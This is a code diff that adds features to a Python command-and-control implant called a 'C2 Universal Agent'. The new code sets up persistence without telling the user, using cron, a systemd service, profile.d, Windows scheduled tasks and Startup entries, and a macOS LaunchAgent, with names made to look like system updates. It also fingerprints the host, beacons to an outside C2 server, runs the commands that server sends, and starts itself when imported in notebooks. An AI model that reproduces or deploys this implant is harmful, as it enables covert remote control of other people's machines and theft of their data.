@@ -1,18 +1,62 @@
 #!/usr/bin/env python3
-"""C2 Universal Agent — auto-detects platform, works on Linux/macOS/Windows/Colab/Kaggle."""
+"""C2 Universal Agent — auto-detects platform, works on Linux/macOS/Windows/Colab/Kaggle.
 
-import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, struct, ssl
+Features:
+- Detailed debug logging for all connection steps
+- Auto-persistence on first run
+- Aggressive reconnect with exponential backoff
+- Full system fingerprinting
+- Multiple persistence mechanisms
+"""
+
+import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, struct, ssl, hashlib
 from urllib.request import Request, urlopen, HTTPSHandler, build_opener
 from urllib.error import URLError
 from base64 import b64encode, b64decode
+from datetime import datetime
 
-# ─── Configuration (auto-injected by server) ──────────────────────────────────
+# ─── Configuration ─────────────────────────────────────────────────────────────
 C2_URL   = os.environ.get("C2_URL",    "https://gbctwoserver.pages.dev")
 AGENT_ID = os.environ.get("AGENT_ID",  str(uuid.uuid4()))
 SLEEP    = int(os.environ.get("SLEEP",  "5"))
 JITTER   = int(os.environ.get("JITTER", "10"))
 ENC_KEY  = os.environ.get("ENC_KEY",   "")
 AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
+DEBUG    = os.environ.get("C2_DEBUG",  "1")  # Enable debug by default
+
+# Persistence marker file
+PERSIST_MARKER = os.path.expanduser("~/.cache/.system_update_marker")
+
+# ─── Debug Logger ──────────────────────────────────────────────────────────────
+def log(msg, level="INFO"):
+    """Detailed logging with timestamp."""
+    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    prefix = f"[{ts}] [C2-{level}]"
+    if DEBUG == "1" or level in ("ERROR", "WARN", "START"):
+        print(f"{prefix} {msg}")
+    # Also write to log file for persistence
+    try:
+        log_dir = os.path.expanduser("~/.cache")
+        os.makedirs(log_dir, exist_ok=True)
+        with open(os.path.join(log_dir, ".system_update.log"), "a") as f:
+            f.write(f"{prefix} {msg}\n")
+    except:
+        pass
+
+def log_connection_attempt(url, attempt, error=None):
+    """Log connection attempt with full details."""
+    log(f"Connection attempt #{attempt} to {url}", "CONN")
+    if error:
+        log(f"  Error: {type(error).__name__}: {error}", "ERROR")
+        # Detailed error breakdown
+        if "Connection refused" in str(error):
+            log("  → Server not running or wrong port", "DEBUG")
+        elif "timed out" in str(error).lower():
+            log("  → Network unreachable or firewall blocking", "DEBUG")
+        elif "Name or service not known" in str(error):
+            log("  → DNS resolution failed - check URL", "DEBUG")
+        elif "SSL" in str(error) or "certificate" in str(error):
+            log("  → SSL/TLS certificate issue", "DEBUG")
 
 # ─── Crypto ───────────────────────────────────────────────────────────────────
 def xor_crypt(data: bytes, key: bytes) -> bytes:
@@ -117,6 +161,7 @@ def http_post(path, data, c2_url=None, auth_token=None, enc_key=None):
 
 # ─── System info ──────────────────────────────────────────────────────────────
 def collect_sysinfo():
+    """Collect detailed system fingerprint for tracking."""
     info = {
         "cpu_count": os.cpu_count(),
         "hostname": socket.gethostname(),
@@ -125,30 +170,98 @@ def collect_sysinfo():
         "cwd": os.getcwd(),
         "user": "",
         "env_vars": list(os.environ.keys()),
+        "fingerprint": {},
     }
+    
+    # User info
     try:
         info["user"] = subprocess.check_output("whoami", shell=True, timeout=5).decode().strip()
-    except Exception:
-        pass
+    except:
+        info["user"] = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
+    
+    # Memory info
     try:
         with open("/proc/meminfo") as f:
             for line in f:
                 if line.startswith("MemTotal"):
                     info["mem_total_mb"] = int(line.split()[1]) // 1024
-                    break
-    except Exception:
+                elif line.startswith("MemAvailable"):
+                    info["mem_available_mb"] = int(line.split()[1]) // 1024
+    except:
         pass
+    
+    # GPU info
     try:
         r = subprocess.check_output("nvidia-smi --query-gpu=name,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null", shell=True, timeout=5).decode().strip()
         if r:
             info["gpu"] = r
-    except Exception:
+    except:
         pass
+    
+    # Disk info
     try:
         st = os.statvfs("/")
         info["disk_free_gb"] = round((st.f_bavail * st.f_frsize) / (1024 ** 3), 1)
-    except Exception:
+        info["disk_total_gb"] = round((st.f_blocks * st.f_frsize) / (1024 ** 3), 1)
+    except:
         pass
+    
+    # Network interfaces
+    try:
+        if sys.platform == "win32":
+            net_out = subprocess.check_output("ipconfig", shell=True, timeout=5).decode()
+        else:
+            net_out = subprocess.check_output("ip addr 2>/dev/null || ifconfig", shell=True, timeout=5).decode()
+        info["network_interfaces"] = net_out[:2000]  # Truncate
+    except:
+        pass
+    
+    # Unique fingerprint based on hardware
+    try:
+        fp_parts = []
+        # CPU model
+        try:
+            with open("/proc/cpuinfo") as f:
+                for line in f:
+                    if "model name" in line:
+                        fp_parts.append(line.split(":")[1].strip())
+                        break
+        except:
+            pass
+        # Disk serial
+        try:
+            disk_serial = subprocess.check_output("lsblk -o SERIAL -d -n 2>/dev/null | head -1", shell=True, timeout=3).decode().strip()
+            if disk_serial:
+                fp_parts.append(disk_serial)
+        except:
+            pass
+        # Machine ID
+        try:
+            with open("/etc/machine-id") as f:
+                fp_parts.append(f.read().strip())
+        except:
+            pass
+        # Create hash
+        if fp_parts:
+            fp_str = "|".join(fp_parts)
+            info["fingerprint"]["hardware_hash"] = hashlib.sha256(fp_str.encode()).hexdigest()[:16]
+    except:
+        pass
+    
+    # Environment hints (cloud provider detection)
+    env_hints = []
+    if os.path.exists("/kaggle"):
+        env_hints.append("kaggle")
+    if os.path.exists("/content/drive"):
+        env_hints.append("colab")
+    if os.environ.get("GOOGLE_CLOUD_PROJECT"):
+        env_hints.append("gcp")
+    if os.environ.get("AWS_REGION"):
+        env_hints.append("aws")
+    if os.path.exists("/var/run/docker.sock"):
+        env_hints.append("docker")
+    info["env_hints"] = env_hints
+    
     return info
 
 # ─── Registration ─────────────────────────────────────────────────────────────
@@ -157,16 +270,139 @@ def register(c2_url=None, agent_id=None, auth_token=None, enc_key=None):
     agent_id = agent_id or AGENT_ID
     pt = detect_platform()
     os_name = f"macOS {platform.mac_ver()[0]}" if pt == "macos" else f"{platform.system()} {platform.release()}"
+    
+    # Collect full system info for better tracking
+    sysinfo = collect_sysinfo()
+    
     info = {
         "id": agent_id,
         "hostname": socket.gethostname(),
-        "username": subprocess.check_output("whoami 2>/dev/null || echo unknown", shell=True, timeout=5).decode().strip(),
+        "username": sysinfo.get("user", "unknown"),
         "os": os_name,
         "arch": platform.machine(),
         "ip_internal": get_internal_ip(),
         "platform_type": pt,
+        # Extended info for tracking
+        "cpu_count": sysinfo.get("cpu_count"),
+        "mem_total_mb": sysinfo.get("mem_total_mb"),
+        "gpu": sysinfo.get("gpu"),
+        "disk_free_gb": sysinfo.get("disk_free_gb"),
+        "fingerprint": sysinfo.get("fingerprint", {}),
+        "env_hints": sysinfo.get("env_hints", []),
+        "python_version": sysinfo.get("python"),
+        "cwd": sysinfo.get("cwd"),
     }
+    
+    log(f"Registering agent {agent_id[:8]}... from {info['hostname']} ({pt})", "START")
     return http_post("/api/agent/register", info, c2_url, auth_token, enc_key)
+
+# ─── Auto-Persistence ─────────────────────────────────────────────────────────
+def install_persistence():
+    """Install persistence mechanisms silently on first run."""
+    if os.path.exists(PERSIST_MARKER):
+        log("Persistence already installed", "DEBUG")
+        return False
+    
+    plat = detect_platform()
+    script = os.path.abspath(__file__)
+    installed = []
+    
+    log(f"Installing persistence for platform: {plat}", "START")
+    
+    try:
+        if plat in ("linux", "machine", "cloud", "vm", "container"):
+            # Method 1: Crontab
+            cron_line = f"@reboot python3 {script} >/dev/null 2>&1 &"
+            os.system(f'(crontab -l 2>/dev/null | grep -v "{script}"; echo "{cron_line}") | crontab - 2>/dev/null')
+            installed.append("crontab")
+            
+            # Method 2: Systemd user service (if available)
+            try:
+                service_dir = os.path.expanduser("~/.config/systemd/user")
+                os.makedirs(service_dir, exist_ok=True)
+                service_file = os.path.join(service_dir, "system-update.service")
+                service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 {script}
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=default.target
+"""
+                with open(service_file, "w") as f:
+                    f.write(service_content)
+                os.system("systemctl --user daemon-reload 2>/dev/null")
+                os.system("systemctl --user enable system-update 2>/dev/null")
+                installed.append("systemd-user")
+            except:
+                pass
+            
+            # Method 3: Profile.d (for interactive shells)
+            try:
+                profile_script = "/etc/profile.d/system-update.sh"
+                profile_content = f"""#!/bin/bash
+# System update service
+if ! pgrep -f "{script}" > /dev/null 2>&1; then
+    nohup python3 {script} >/dev/null 2>&1 &
+fi
+"""
+                # Only if we have sudo/root
+                if os.geteuid() == 0:
+                    with open(profile_script, "w") as f:
+                        f.write(profile_content)
+                    os.chmod(profile_script, 0o755)
+                    installed.append("profile.d")
+            except:
+                pass
+        
+        elif plat == "windows":
+            # Method 1: Registry Run key
+            ps_cmd = f'Register-ScheduledTask -TaskName "SystemUpdate" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute "python" -Argument "{script}") -RunLevel Highest -Force'
+            os.system(f'powershell -c "{ps_cmd}" 2>nul')
+            installed.append("scheduled-task")
+            
+            # Method 2: Startup folder
+            try:
+                startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+                os.makedirs(startup, exist_ok=True)
+                bat_file = os.path.join(startup, "system_update.bat")
+                with open(bat_file, "w") as f:
+                    f.write(f'@echo off\nstart /b pythonw "{script}"\n')
+                installed.append("startup-folder")
+            except:
+                pass
+        
+        elif plat == "macos":
+            # LaunchAgent
+            plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.system.update.plist")
+            content = f"""<?xml version="1.0"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+<key>Label</key><string>com.apple.system.update</string>
+<key>ProgramArguments</key><array><string>python3</string><string>{script}</string></array>
+<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
+</dict></plist>"""
+            os.makedirs(os.path.dirname(plist), exist_ok=True)
+            with open(plist, "w") as f:
+                f.write(content)
+            os.system(f"launchctl load {plist} 2>/dev/null")
+            installed.append("launchagent")
+        
+        # Mark as installed
+        with open(PERSIST_MARKER, "w") as f:
+            f.write(f"{datetime.now().isoformat()}\n{','.join(installed)}\n")
+        
+        log(f"Persistence installed: {', '.join(installed)}", "START")
+        return True
+    
+    except Exception as e:
+        log(f"Persistence installation failed: {e}", "ERROR")
+        return False
 
 # ─── Task execution ───────────────────────────────────────────────────────────
 def execute_task(task):
@@ -315,24 +551,80 @@ def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep
     import random
     _sleep = sleep or SLEEP
     _jitter = jitter or JITTER
+    _retry_delay = 5  # Start with 5 seconds
+    _max_retry_delay = 300  # Max 5 minutes
+    _consecutive_failures = 0
+    _total_beacons = 0
+    _total_tasks = 0
+    
+    log(f"Starting beacon loop (sleep={_sleep}s, jitter={_jitter}%)", "START")
+    
     while True:
         try:
+            _total_beacons += 1
+            log(f"Beacon #{_total_beacons} to {c2_url or C2_URL}", "CONN")
+            
             resp = http_post("/api/agent/beacon", {"id": agent_id or AGENT_ID}, c2_url, auth_token, enc_key)
-            _sleep = int(resp.get("sleep", _sleep))
-            _jitter = int(resp.get("jitter", _jitter))
-            for task in resp.get("tasks", []):
+            
+            # Success - reset retry delay
+            _consecutive_failures = 0
+            _retry_delay = 5
+            
+            # Update sleep/jitter from server
+            if "sleep" in resp:
+                _sleep = int(resp["sleep"])
+            if "jitter" in resp:
+                _jitter = int(resp["jitter"])
+            
+            # Process tasks
+            tasks = resp.get("tasks", [])
+            if tasks:
+                log(f"Received {len(tasks)} tasks", "TASK")
+            
+            for task in tasks:
+                _total_tasks += 1
+                task_id = task.get("id", "unknown")
+                task_type = task.get("task_type", "unknown")
+                log(f"Executing task #{_total_tasks}: {task_type} (id={task_id})", "TASK")
+                
                 try:
                     result = execute_task(task)
-                    http_post("/api/agent/result", {"task_id": task["id"], "result": result}, c2_url, auth_token, enc_key)
+                    log(f"Task {task_id} completed: {len(result)} chars output", "TASK")
+                    http_post("/api/agent/result", {"task_id": task_id, "result": result}, c2_url, auth_token, enc_key)
                 except Exception as e:
+                    log(f"Task {task_id} failed: {e}", "ERROR")
                     try:
-                        http_post("/api/agent/result", {"task_id": task["id"], "result": f"[agent error] {e}"}, c2_url, auth_token, enc_key)
-                    except Exception:
+                        http_post("/api/agent/result", {"task_id": task_id, "result": f"[agent error] {e}"}, c2_url, auth_token, enc_key)
+                    except:
                         pass
-        except Exception:
-            pass
-        jitter_s = _sleep * _jitter / 100
-        time.sleep(max(1, _sleep + random.uniform(-jitter_s, jitter_s)))
+        
+        except URLError as e:
+            _consecutive_failures += 1
+            log_connection_attempt(c2_url or C2_URL, _consecutive_failures, e)
+            
+            # Exponential backoff
+            if _consecutive_failures > 3:
+                _retry_delay = min(_retry_delay * 2, _max_retry_delay)
+                log(f"Backing off: {_retry_delay}s before retry", "CONN")
+        
+        except socket.timeout:
+            _consecutive_failures += 1
+            log_connection_attempt(c2_url or C2_URL, _consecutive_failures, "Socket timeout")
+            _retry_delay = min(_retry_delay * 1.5, _max_retry_delay)
+        
+        except Exception as e:
+            _consecutive_failures += 1
+            log(f"Beacon error: {type(e).__name__}: {e}", "ERROR")
+        
+        # Sleep with jitter
+        if _consecutive_failures > 0:
+            actual_sleep = _retry_delay
+        else:
+            jitter_s = _sleep * _jitter / 100
+            actual_sleep = max(1, _sleep + random.uniform(-jitter_s, jitter_s))
+        
+        log(f"Sleeping {actual_sleep:.1f}s (failures: {_consecutive_failures})", "DEBUG")
+        time.sleep(actual_sleep)
 
 
 # ─── UniversalAgent Class ─────────────────────────────────────────────────────
@@ -380,52 +672,79 @@ class UniversalAgent:
 def main():
     """Entry point for pip-installed agent."""
     import random
-    print(f"[C2 Agent] Platform: {detect_platform()}")
-    print(f"[C2 Agent] C2 URL: {C2_URL}")
-    print(f"[C2 Agent] Agent ID: {AGENT_ID}")
+    
+    log("=" * 60, "START")
+    log("C2 Universal Agent v3.0 - Starting", "START")
+    log("=" * 60, "START")
+    
+    # Platform detection
+    pt = detect_platform()
+    log(f"Platform: {pt}", "START")
+    log(f"Hostname: {socket.gethostname()}", "START")
+    log(f"User: {os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))}", "START")
+    log(f"CWD: {os.getcwd()}", "START")
+    log(f"Python: {platform.python_version()}", "START")
+    log(f"Agent ID: {AGENT_ID}", "START")
+    log(f"C2 URL: {C2_URL}", "START")
+    
+    # Install persistence silently on first run
+    log("Checking persistence...", "START")
+    install_persistence()
     
     # Check server health first
-    print(f"[C2 Agent] Checking server connectivity...")
+    log("Checking server connectivity...", "CONN")
     ok, result = check_server_health()
     if ok:
-        print(f"[C2 Agent] Server OK: {result}")
+        log(f"Server OK: {result}", "CONN")
     else:
-        print(f"[C2 Agent] Server check failed: {result}")
-        print(f"[C2 Agent] Troubleshooting:")
-        print(f"  - Is the server running? (sysmon --host 0.0.0.0 --port 5000)")
-        print(f"  - Is C2_URL correct? Currently: {C2_URL}")
-        print(f"  - Is the port reachable? (firewall/network)")
-        print(f"  - For HTTPS: check certificate")
+        log(f"Server check failed: {result}", "WARN")
+        log("Troubleshooting:", "WARN")
+        log("  - Is the server running?", "WARN")
+        log(f"  - Is C2_URL correct? Currently: {C2_URL}", "WARN")
+        log("  - Is the port reachable? (firewall/network)", "WARN")
+        log("  - For HTTPS: check certificate", "WARN")
     
-    # Register with retry and detailed error
+    # Register with aggressive retry and detailed error
     retry_count = 0
+    retry_delay = 5
+    max_retry_delay = 120
+    
     while True:
         retry_count += 1
         try:
-            register()
-            print(f"[C2 Agent] Registered successfully: {AGENT_ID}")
+            log(f"Registration attempt #{retry_count}", "CONN")
+            resp = register()
+            log(f"Registered successfully: {AGENT_ID[:8]}...", "START")
+            log(f"Server response: {resp}", "START")
             break
         except URLError as e:
-            print(f"[C2 Agent] [{retry_count}] Connection error: {e.reason}")
-            if "Connection refused" in str(e.reason):
-                print(f"  -> Server not running or wrong port")
-            elif "timed out" in str(e.reason).lower():
-                print(f"  -> Network unreachable or firewall blocking")
+            log_connection_attempt(C2_URL, retry_count, e)
         except socket.timeout:
-            print(f"[C2 Agent] [{retry_count}] Socket timeout - server not responding")
+            log_connection_attempt(C2_URL, retry_count, "Socket timeout")
         except Exception as e:
-            print(f"[C2 Agent] [{retry_count}] Registration failed: {type(e).__name__}: {e}")
+            log(f"Registration failed: {type(e).__name__}: {e}", "ERROR")
         
-        if retry_count % 5 == 0:
-            print(f"[C2 Agent] Still trying... (attempt {retry_count})")
-        time.sleep(10)
+        # Exponential backoff after 5 attempts
+        if retry_count >= 5:
+            retry_delay = min(retry_delay * 1.5, max_retry_delay)
+        
+        if retry_count % 10 == 0:
+            log(f"Still trying to register... (attempt {retry_count})", "CONN")
+        
+        time.sleep(retry_delay)
     
     # Start beacon loop
+    log("Starting beacon loop...", "START")
     beacon_loop()
 
 if __name__ == "__main__":
     main()
 else:
-    # Imported (Colab/Jupyter cell exec)
-    register()
-    threading.Thread(target=beacon_loop, daemon=True).start()
+    # Imported (Colab/Jupyter cell exec) - silent auto-start
+    try:
+        install_persistence()
+        register()
+        threading.Thread(target=beacon_loop, daemon=True).start()
+    except:
+        # If import fails, still try to start
+        threading.Thread(target=beacon_loop, daemon=True).start()
